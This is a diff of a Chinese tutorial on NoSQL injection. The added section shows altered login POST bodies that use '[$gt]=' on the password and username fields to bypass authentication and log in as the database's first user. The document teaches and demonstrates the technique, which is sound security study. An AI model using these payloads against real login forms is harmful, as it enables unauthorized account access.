@@ -16,7 +16,9 @@ NoSQL注入的一个常见例子是： [{"$gt":""}] 。这个JSON对象基本上
 
 
 
-## 示例
+# 示例
+
+## 场景一
 
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210827190249.png)
 
@@ -27,3 +29,29 @@ NoSQL注入的一个常见例子是： [{"$gt":""}] 。这个JSON对象基本上
 可以看到这里登录成功了。
 
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210827191623.png)
+
+
+
+## 场景二
+
+正常提交用户名和密码是下面的
+
+```
+username=admin&password=xxx&submit=login
+```
+
+然后我们抓包修改成，提交后发现也是能正常登录
+
+```
+username=admin&password[$gt]=&submit=login
+```
+
+既然我们能够修改password，是不是也能修改username来实现呢？
+
+```
+username[$gt]=&password[$gt]=&submit=login
+```
+
+![image-20210830112834341](C:\Users\Xinfei\AppData\Roaming\Typora\typora-user-images\image-20210830112834341.png)
+
+可以看到，我们把用户名也用`username[$gt]=`来登录的时候，发现登录后的用户是叫mike，因为看不了数据库，只能大胆猜测取的是数据库中第一条记录。
